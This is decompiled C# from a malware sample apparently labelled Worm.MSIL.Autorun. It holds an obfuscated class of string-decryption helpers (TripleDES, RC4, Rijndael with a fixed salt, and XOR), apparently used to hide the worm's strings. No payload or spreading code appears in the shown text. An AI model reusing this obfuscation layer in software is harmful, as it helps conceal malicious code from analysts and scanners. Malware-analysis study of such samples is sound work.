// Decompiled with JetBrains decompiler
// Type: A.c4b6f6be8c453ab01d199807056388c5e
// Assembly: Themes, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F1CED465-DC2F-40DF-8008-E1A5BA91B6DC
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00008-msil\Worm.MSIL.Autorun.gj-eafdf0c256b415039327b1617f1f280eb22975e5d3328254127f60f9f6fa09f7.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace A
{
  internal class c4b6f6be8c453ab01d199807056388c5e
  {
    [DebuggerNonUserCode]
    public c4b6f6be8c453ab01d199807056388c5e()
    {
    }

    public static string cb70c1d106d22f042e689082f38a09fd2(
      string cbbac5187c0ceecf3c09a933b555da5e3,
      string c16715b23b6978b883ff81afba96ae783,
      bool c0e84c6ad57bf3a5f4b70015d32038867)
    {
      byte[] inputBuffer = Convert.FromBase64String(cbbac5187c0ceecf3c09a933b555da5e3);
      byte[] numArray = !c0e84c6ad57bf3a5f4b70015d32038867 ? Encoding.UTF8.GetBytes(c16715b23b6978b883ff81afba96ae783) : new MD5CryptoServiceProvider().ComputeHash(Encoding.UTF8.GetBytes(c16715b23b6978b883ff81afba96ae783));
      TripleDESCryptoServiceProvider cryptoServiceProvider = new TripleDESCryptoServiceProvider();
      cryptoServiceProvider.Key = numArray;
      cryptoServiceProvider.Mode = CipherMode.ECB;
      cryptoServiceProvider.Padding = PaddingMode.PKCS7;
      return Encoding.UTF8.GetString(cryptoServiceProvider.CreateDecryptor().TransformFinalBlock(inputBuffer, 0, inputBuffer.Length));
    }

    public static string ccb7e66ddaa2f8ad76005f441a3eb7052(
      string ca3a3518c409ee1919335efa5158fe2ff,
      string c33d668f28ecbedbede1d84e8c42393ed)
    {
      int index1 = 0;
      int index2 = 0;
      StringBuilder stringBuilder = new StringBuilder();
      string empty = string.Empty;
      int[] numArray1 = new int[257];
      int[] numArray2 = new int[257];
      int length = c33d668f28ecbedbede1d84e8c42393ed.Length;
      int location1 = 0;
      while (location1 <= (int) byte.MaxValue)
      {
        char String = c33d668f28ecbedbede1d84e8c42393ed.Substring(location1 % length, 1).ToCharArray()[0];
        numArray2[location1] = Strings.Asc(String);
        numArray1[location1] = location1;
        Math.Max(Interlocked.Increment(ref location1), checked (location1 - 1));
      }
      int index3 = 0;
      int location2 = 0;
      while (location2 <= (int) byte.MaxValue)
      {
        index3 = checked (index3 + numArray1[location2] + numArray2[location2]) % 256;
        int num = numArray1[location2];
        numArray1[location2] = numArray1[index3];
        numArray1[index3] = num;
        Math.Max(Interlocked.Increment(ref location2), checked (location2 - 1));
      }
      location1 = 1;
      while (location1 <= ca3a3518c409ee1919335efa5158fe2ff.Length)
      {
        index1 = checked (index1 + 1) % 256;
        index2 = checked (index2 + numArray1[index1]) % 256;
        int num1 = numArray1[index1];
        numArray1[index1] = numArray1[index2];
        numArray1[index2] = num1;
        int num2 = numArray1[checked (numArray1[index1] + numArray1[index2]) % 256];
        int CharCode = Strings.Asc(ca3a3518c409ee1919335efa5158fe2ff.Substring(checked (location1 - 1), 1).ToCharArray()[0]) ^ num2;
        stringBuilder.Append(Strings.Chr(CharCode));
        Math.Max(Interlocked.Increment(ref location1), checked (location1 - 1));
      }
      string str = stringBuilder.ToString();
      stringBuilder.Length = 0;
      return str;
    }

    public static object c654e40b28da2395755ca28ae0ddb39d5(
      string c3eedc13aa0be55b91f194aa950de4805,
      string ca1ab96714e76cf9ac0756fa822547fb1)
    {
      RijndaelManaged rijndaelManaged = new RijndaelManaged();
      byte[] salt = new byte[8]
      {
        (byte) 1,
        (byte) 2,
        (byte) 3,
        (byte) 4,
        (byte) 5,
        (byte) 6,
        (byte) 7,
        (byte) 8
      };
      Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(ca1ab96714e76cf9ac0756fa822547fb1, salt);
      rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.Key.Length);
      rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.IV.Length);
      MemoryStream memoryStream = new MemoryStream();
      CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write);
      try
      {
        byte[] buffer = Convert.FromBase64String(c3eedc13aa0be55b91f194aa950de4805);
        cryptoStream.Write(buffer, 0, buffer.Length);
        cryptoStream.Close();
        c3eedc13aa0be55b91f194aa950de4805 = Encoding.UTF8.GetString(memoryStream.ToArray());
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return (object) c3eedc13aa0be55b91f194aa950de4805;
    }

    public static string c33621ed5e8cf8007cc0b33f6c1cee8b3(
      string c4e7adb2c99da6d8414e74e2c7d124a39,
      string c1215c9b7def7b8b1f65ac00fc00ffc4e)
    {
      string str = "";
      long num1 = checked ((long) Math.Round(unchecked ((double) Strings.Len(c1215c9b7def7b8b1f65ac00fc00ffc4e) / 2.0)));
      long num2 = 1;
      while (num2 <= num1)
      {
        int num3 = checked ((int) Math.Round(Conversion.Val("&H" + Strings.Mid(c1215c9b7def7b8b1f65ac00fc00ffc4e, (int) (2L * num2 - 1L), 2))));
        int num4 = Strings.Asc(Strings.Mid(c4e7adb2c99da6d8414e74e2c7d124a39, checked ((int) (unchecked (num2 % (long) Strings.Len(c4e7adb2c99da6d8414e74e2c7d124a39)) + 1L)), 1));
        str += Conversions.ToString(Strings.Chr(num3 ^ num4));
        checked { ++num2; }
      }
      return str;
    }
  }
}
